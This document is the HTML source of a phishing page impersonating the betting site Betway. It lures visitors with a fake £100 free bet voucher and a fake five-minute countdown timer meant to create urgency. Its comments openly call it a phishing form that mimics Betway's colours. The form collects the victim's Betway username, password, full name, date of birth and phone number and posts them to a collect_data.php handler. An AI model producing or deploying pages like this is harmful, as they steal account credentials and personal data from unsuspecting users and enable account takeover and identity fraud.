<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Betway Free Voucher Giveaway</title>
    <style>
        /* CSS mimicking Betway's color scheme */
        body { 
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
        }
        .header {
            background-color: #FFDF00;
            padding: 15px;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .btn {
            background-color: #FFDF00;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="betway-logo.png" alt="Betway Logo">
    </div>
    
    <div class="container">
        <h1>Congratulations! You've Been Selected!</h1>
        <p>You've been chosen to receive a £100 Betway Free Bet Voucher!</p>
        <p>Limited time offer: Only 50 vouchers remaining!</p>
        
        <!-- This is where the phishing form would collect data -->
        <form id="voucher-form" action="collect_data.php" method="POST">
            <div class="form-group">
                <label>Betway Username:</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <div class="form-group">
                <label>Full Name:</label>
                <input type="text" name="fullname" required>
            </div>
            <div class="form-group">
                <label>Date of Birth:</label>
                <input type="date" name="dob" required>
            </div>
            <div class="form-group">
                <label>Phone Number:</label>
                <input type="tel" name="phone" required>
            </div>
            <button type="submit" class="btn">Claim Your £100 Free Bet Now!</button>
        </form>
        
        <div class="countdown">
            <p>Offer expires in: <span id="timer">05:00</span></p>
        </div>
    </div>

    <script>
        // Fake countdown timer to create urgency
        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                
                display.textContent = minutes + ":" + seconds;
                
                if (--timer < 0) {
                    timer = 0;
                }
            }, 1000);
        }
        
        window.onload = function () {
            var fiveMinutes = 60 * 5,
                display = document.querySelector('#timer');
            startTimer(fiveMinutes, display);
        };
    </script>
</body>
</html>
